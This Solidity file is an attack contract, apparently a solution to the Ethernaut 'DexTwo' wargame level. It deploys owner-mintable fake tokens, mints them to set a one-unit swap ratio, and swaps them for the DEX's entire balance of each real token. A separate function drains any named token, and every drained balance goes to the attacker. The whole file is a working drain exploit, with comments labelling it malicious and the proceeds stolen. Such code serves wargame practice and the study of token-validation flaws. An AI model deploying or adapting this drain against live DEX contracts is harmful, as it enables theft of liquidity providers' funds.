// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapAmount(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
}

// Simple malicious token that we control
contract MaliciousTokenSimple is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        _allowances[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        _allowances[from][msg.sender] -= amount;
        _balances[from] -= amount;
        _balances[to] += amount;
        return true;
    }
    
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }
    
    // Special function to set balance
    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        _balances[to] = amount;
    }
}

contract SimpleDexTwoAttack {
    IDexTwo public dexTwo;
    MaliciousTokenSimple public malToken1;
    MaliciousTokenSimple public malToken2;
    address public owner;
    
    constructor(address _dexTwo) {
        dexTwo = IDexTwo(_dexTwo);
        owner = msg.sender;
        
        // Deploy two malicious tokens
        malToken1 = new MaliciousTokenSimple();
        malToken2 = new MaliciousTokenSimple();
    }
    
    function attack() external {
        require(msg.sender == owner, "Only owner");
        
        // Get the actual token addresses from DexTwo
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();
        
        // Attack token1
        if (token1 != address(0)) {
            _drainToken(token1, address(malToken1));
        }
        
        // Attack token2
        if (token2 != address(0)) {
            _drainToken(token2, address(malToken2));
        }
    }
    
    function _drainToken(address targetToken, address maliciousToken) internal {
        uint256 dexBalance = IERC20(targetToken).balanceOf(address(dexTwo));
        
        if (dexBalance > 0) {
            // Mint 1 token to dexTwo to establish a ratio
            MaliciousTokenSimple(maliciousToken).mint(address(dexTwo), 1);
            
            // Mint tokens to ourselves equal to the target balance
            MaliciousTokenSimple(maliciousToken).mint(address(this), dexBalance);
            
            // Approve dexTwo to spend our tokens
            IERC20(maliciousToken).approve(address(dexTwo), dexBalance);
            
            // Swap our malicious tokens for all the target tokens
            dexTwo.swap(maliciousToken, targetToken, dexBalance);
            
            // Transfer the stolen tokens to owner
            IERC20(targetToken).transfer(owner, IERC20(targetToken).balanceOf(address(this)));
        }
    }
    
    // Backup function to drain a specific token
    function drainSpecificToken(address targetToken) external {
        require(msg.sender == owner, "Only owner");
        _drainToken(targetToken, address(malToken1));
    }
    
    // Helper to check token addresses
    function checkSetup() external view returns (address token1, address token2, uint256 bal1, uint256 bal2) {
        token1 = dexTwo.token1();
        token2 = dexTwo.token2();
        if (token1 != address(0)) {
            bal1 = IERC20(token1).balanceOf(address(dexTwo));
        }
        if (token2 != address(0)) {
            bal2 = IERC20(token2).balanceOf(address(dexTwo));
        }
    }
}